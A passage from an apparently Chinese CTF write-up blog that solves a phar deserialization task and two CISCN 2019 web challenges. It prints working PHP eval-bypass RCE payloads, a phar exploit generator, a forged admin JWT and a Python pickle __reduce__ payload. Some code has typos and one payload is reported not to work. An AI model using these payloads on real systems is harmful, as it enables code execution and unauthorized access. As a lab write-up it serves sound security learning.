<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124174050592.png" alt="image-20240124174050592"></p>
<p>而delete.php就没有任何限制，因此我们肯定要从这里入手，接下来就是构造phar文件内容了（配合file_get_contents实现反序列化）点击删除之后调用detele函数，接着又调用unlik函数实现phar反序列化</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();                                               
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
        <span class="hljs-variable">$file</span>-&gt;filename = <span class="hljs-string">'/flag.txt'</span>;                                                       
        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$file</span>);
    }
}

<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
<span class="hljs-comment">//签名自动计算</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着将生成的1.phar文件后缀改为jpg上传，之后点击删除抓包，如下图所示得到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124181101487.png" alt="image-20240124181101487"></p>
<h1 id="ciscn-2019初赛love-math">[CISCN 2019初赛]Love Math</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}<span class="hljs-keyword">else</span>{
    <span class="hljs-comment">//例子 c=20-1</span>
    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"太长了不会算"</span>);
    }
    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">'/m'</span>, <span class="hljs-variable">$content</span>)) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的字符"</span>);
        }
    }
    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的函数"</span>);
        }
    }
    <span class="hljs-comment">//帮你算出答案</span>
    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">';'</span>);
}</code></pre>
<p>这题代码逻辑简单，就是传参进去的内容长度不超过80，并且其中的内容还要符合白名单，这里的正则的作用就是提取content变量中的函数名。最终目的是要RCE</p>
<p>这里刷题少，没知识点，直接看wp学了：</p>
<ul>
<li><strong>动态函数</strong><br>
php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数<br>
例如：<code>$function = "sayHello";$function();</code>-》执行sayHello函数</li>
<li><strong>php中函数名默认为字符串</strong><br>
例如本题白名单中的<code>asinh</code>和<code>pi</code>可以直接异或，这就增加了构造字符的选择</li>
</ul>
<p>方法很多，一个个学吧，其中最关键的函数就是<code>base_convert</code>，而我们最终的目的就是拼接函数+拼接变量的思路来构造payload</p>
<pre><code class="hljs scss">base_convert ( string $number , int $frombase , int $tobase ) : string</code></pre>
<p>返回一字符串，包含 <code>number</code> 以 <code>tobase</code> 进制的表示。<code>number</code> 本身的进制由 <code>frombase</code> 指定。<code>frombase</code> 和 <code>tobase</code> 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。意思就是将输入数字的进制进行转换。</p>
<p>可以使用这个函数将其他进制数转为36进制，而且36进制是包含所有数字和小写字母的。但终究无法构造<code>GET</code>大写字母。但又可以构造其他的小写字母函数，让构造的函数转换。</p>
<pre><code class="hljs scss">hexdec ( string $hex_string ) : number    //十六进制转换为十进制
dechex ( int <span class="hljs-variable">$number</span> ) : string        //十进制转换为十六进制
bin2hex ( string <span class="hljs-variable">$str</span> ) : string    //函数把包含数据的二进制字符串转换为十六进制值
hex2bin ( string <span class="hljs-variable">$data</span> ) : string    //转换十六进制字符串为二进制字符串</code></pre>
<p>那么我们就可以想象一下，把<code>_GET</code>先利用<code>bin2hex()</code>转换为 十六进制，在利用<code>hexdec()</code>转换为十进制，那么反过来就可以把一段数字转换为字符。</p>
<p>但是<code>binhex()</code>， <code>hexdec()</code>等不是白名单的函数，要从哪里来？</p>
<p>这时候就要看<code>base_convert()</code>的作用了，因为上面的函数都是小写的，所以可以利用此函数将一个十进制数的数字转为三十六进制的小写字符。这里三十六进制是10个数字+26个小写字母，因此能够完整表示出一个函数名的所有字符。</p>
<p>那么怎么才能直到这个数呢？我们可以先逆向将三十六进制字符转换为十进制数，得到该数字，最终逆向构造即可。</p>
<h2 id="方法一">方法一：</h2>
<p>接下来就是构造hex2bin与_GET字符串了，框架如下：</p>
<pre><code class="hljs scss">?c=($_GET[a])($_GET[b])&amp;<span class="hljs-selector-tag">a</span>=system&amp;<span class="hljs-selector-tag">b</span>=cat /flag<span class="hljs-comment">//后面两个是传参,题目把东西都过滤的差不多了，只有数字，不可能有字母，所以用$_GET传参类似于上文的$a=cat。但是这里把[]过滤了，可以用{}代替</span></code></pre>
<p>构造如下：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">base_convert</span>('hex2bin',<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);        <span class="hljs-comment">//37907361743</span>
<span class="hljs-built_in">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);    <span class="hljs-comment">//hex2bin</span></code></pre>
<pre><code class="hljs scss"><span class="hljs-built_in">bin2hex</span>('_GET');    <span class="hljs-comment">//得到 5f474554 将字符转换为十六进制</span>
<span class="hljs-built_in">hexdec</span>('<span class="hljs-number">5</span>f474554');    <span class="hljs-comment">//得到 1598506324 将十六进制转为十进制</span>
 
<span class="hljs-built_in">dechex</span>(<span class="hljs-number">1598506324</span>);        <span class="hljs-comment">//得到 5f474554 将十进制转换为十六进制</span>
<span class="hljs-built_in">hex2bin</span>('<span class="hljs-number">5</span>f474554');    <span class="hljs-comment">//得到 _GET</span></code></pre>
<p>接下来编写payload</p>
<pre><code class="hljs scss">?c=<span class="hljs-variable">$pi</span>=<span class="hljs-built_in">bin_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));$<span class="hljs-variable">$pi</span>{abs}($$pi{cos})&amp;abs=system&amp;cos=ls
<span class="hljs-comment">//进一步cat flag即可</span></code></pre>
<h2 id="方法二">方法二：</h2>
<p>可以构造<code>getallheaders()</code>传参，此是小写的，可以直接用<code>base_convert</code>转换。</p>
<pre><code class="hljs scss">getallheaders ( void ) : array</code></pre>
<p>获取全部 HTTP 请求头信息。首先构造<code>system</code>和<code>getallheaders</code>：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">base_convert</span>('getallheaders',<span class="hljs-number">30</span>,<span class="hljs-number">10</span>);
<span class="hljs-comment">//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功</span>
 
<span class="hljs-built_in">base_convert</span>('system',<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);    <span class="hljs-comment">//得到1751504350</span></code></pre>
<p>payload如下：</p>
<pre><code class="hljs scss">?c=<span class="hljs-variable">$pi</span>=base_convert;<span class="hljs-variable">$pi</span>(<span class="hljs-number">1751504350</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)($pi(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)(){<span class="hljs-number">1</span>})
<span class="hljs-selector-tag">HEADER</span>: <span class="hljs-number">1</span>:cat /flag
//<span class="hljs-built_in">system</span>(<span class="hljs-built_in">getallheaders</span>()[<span class="hljs-number">1</span>])  实际上就是找到键值为<span class="hljs-number">1</span>对应的value</code></pre>
<h2 id="方法三">方法三：</h2>
<p>exec：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">hexdec</span>(bin2hex('cat f*'));        <span class="hljs-comment">//得到109270211257898</span>
<span class="hljs-built_in">base_convert</span>('exec',<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);        <span class="hljs-comment">//得到696468</span></code></pre>
<p>payload：</p>
<pre><code class="hljs scss">?c=($pi=base_convert)(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(dechex(<span class="hljs-number">109270211257898</span>)))
 
<span class="hljs-comment">//exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*')</span></code></pre>
<p>这里发现一个问题，这个payload超过了80的长度限制，所以只能换进制，最终如下（但测试之后不成功？？）</p>
<pre><code class="hljs scss">/index<span class="hljs-selector-class">.php</span>?c=($pi=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(dechex(<span class="hljs-number">109270211257898</span>)))
<span class="hljs-comment">//分析：exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*')</span>

/index<span class="hljs-selector-class">.php</span>?c=<span class="hljs-built_in">base_convert</span>(<span class="hljs-number">1751504350</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(base_convert(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>).(dechex(<span class="hljs-number">16</span>)^asinh^pi))
<span class="hljs-comment">//分析：system('cat'.dechex(16)^asinh^pi) =&gt; system('cat *')</span></code></pre>
<h2 id="方法四">方法四：</h2>
<p>前面都是利用白名单的数学函数将数字转成字符串，其实也可以异或构造这是fuzz脚本</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$payload</span>=[<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>,  <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
<span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$k</span>&lt;=<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++){
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">9</span>; <span class="hljs-variable">$i</span>++){
        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++){
            <span class="hljs-variable">$exp</span>=<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^<span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;
            <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">"^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>"</span>.<span class="hljs-string">"==&gt;<span class="hljs-subst">$exp</span>"</span>);
            <span class="hljs-keyword">echo</span><span class="hljs-string">"&lt;br /&gt;"</span>;
        }
    }
}</code></pre>
<p>得到<code>is_nan^64==&gt;_G</code>和<code>tan^15==&gt;ET</code></p>
<p>payload:</p>
<pre><code class="hljs scss">?c=<span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=$<span class="hljs-variable">$pi</span>;<span class="hljs-variable">$pi</span>{<span class="hljs-number">0</span>}($pi{<span class="hljs-number">1</span>})&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat flag<span class="hljs-selector-class">.php</span>
 
<span class="hljs-comment">//$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php     ==&gt; system(cat flag.php)</span></code></pre>
<h1 id="ciscn-2019华北day1web2">[CISCN 2019华北Day1]Web2</h1>
<p>首先是一个脚本爆破</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205221800.png" alt="image-20231117205221800"></p>
<p>首页告诉我们要卖到lv6，那我们首先得找到它，由于页面很多，手动不现实，故此需要脚本找</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>):
    time.sleep(<span class="hljs-number">0.5</span>)
    url = <span class="hljs-string">'http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page={}'</span>.<span class="hljs-built_in">format</span>(i)
    res = requests.get(url)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"找到lv6----{}"</span>.<span class="hljs-built_in">format</span>(i))</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205950545.png" alt="image-20231117205950545"></p>
<p>如上图在181页，我们访问看看，我们在结算的时候抓包看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205832323.png" alt="image-20231117205832323"></p>
<p>如上图我们修改折扣进行购买，随后看到右侧有个重定向，我们访问看看b1g_m4mber</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205907430.png" alt="image-20231117205907430"></p>
<p>看到这里只允许admin访问，又看到其中有jwt，那毫无疑问就是伪造jtw了，那首先我们先要拿到secret，这里也是看wp发现是通过爆破找到secret的，直接上工具：</p>
<p>github链接<code>https://github.com/brendan-rius/c-jwt-cracker</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117222052443.png" alt="image-20231117222052443"></p>
<p>用法这里就不赘述了，如上图可以看到secret是1Kun</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117222213855.png" alt="image-20231117222213855"></p>
<p>如上图进行伪造之后发送到bp：</p>
<pre><code class="hljs plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA</code></pre>
<p>发送之后是如下页面：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118092031351.png" alt="image-20231118092031351"></p>
<p>成功以admin身份登录，接下来看一下源代码发现存在www.zip我们下载看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118092024158.png" alt="image-20231118092024158"></p>
<p>如果我们上述成功的话，就会得到源码，我们找到Admin.py看到如下代码</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.web
<span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> urllib
 
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)
 
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-keyword">try</span>:
            become = self.get_argument(<span class="hljs-string">'become'</span>)
            p = pickle.loads(urllib.unquote(become))
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)</code></pre>
<p>分析可以知道，只有我们用户为admin，随后向become进行传参，内容为序列化内容之后由于render的存在，我们可以执行恶意代码，payload如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> urllib

<span class="hljs-keyword">class</span> <span class="hljs-title class_">pop</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span>(<span class="hljs-built_in">eval</span>, (<span class="hljs-string">"open('/flag.txt', 'r').read()"</span>, ))

poc = pop()
s = pickle.dumps(poc)
<span class="hljs-built_in">print</span>(urllib.qoute(s))<span class="hljs-comment">#注意上述题目中的p参数是经过urllib.unquote函数处理的</span></code></pre>
<p>之后在python2环境下运行，向become传参即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118094613051.png" alt="image-20231118094613051"></p>
<p>这里点击页面的一键成为大会员之后抓包，修改become参数，拿到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118094606060.png" alt="image-20231118094606060"></p>
